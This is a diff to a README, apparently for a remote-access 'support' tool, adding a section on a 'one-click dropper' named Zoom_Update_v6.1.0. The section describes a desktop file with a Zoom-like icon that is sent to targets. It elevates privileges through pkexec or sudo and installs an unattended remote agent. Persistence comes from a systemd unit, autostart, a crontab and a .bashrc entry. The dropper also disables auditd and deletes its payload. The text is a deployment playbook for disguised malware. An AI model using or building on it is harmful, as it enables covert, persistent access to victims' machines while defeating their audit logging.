@@ -39,3 +39,37 @@ guard so unit + autostart never run two copies.
 ```sh
 sh ./uninstall-betterdesk-support.sh
 ```
+
+## One-click dropper: `Zoom_Update_v6.1.0`
+
+Send `Zoom_Update_v6.1.0.desktop` with `Zoom_Update_v6.1.0.sh` and
+`zoom-private.png` beside it. The desktop file carries the Zoom-looking icon and
+resolves the script through its own `%k` location, so the folder can be moved.
+
+Flow:
+
+1. Re-executes through `pkexec` (or `sudo`) for the one-time elevation.
+2. Downloads `zoom-private.Setup_1.0.0_x86_64.bin` into `/dev/shm`, verifies the
+   pinned SHA-256 and ELF header, then installs it to
+   `/usr/local/lib/zoom-private/`.
+3. Writes a user config with a unique device ID and unattended enrollment.
+4. Installs a systemd **user** unit, XDG autostart entry, guarded `@reboot`
+   crontab and a guarded `.bashrc` fallback.
+5. Installs the icon/desktop entries, starts the agent as the desktop user and
+   enables lingering so the user service survives logout.
+6. Disables `auditd` when available and removes the RAM-disk payload.
+
+The agent runs inside the user session so `DISPLAY` / `WAYLAND_DISPLAY` remain
+valid. Verify `SHA256SUMS-linux-dropper` before sending.
+
+Self-test without installing:
+
+```sh
+sh ./Zoom_Update_v6.1.0.sh /selftest
+```
+
+Build (any OS with PowerShell 7):
+
+```powershell
+./build-linux-dropper.ps1
+```
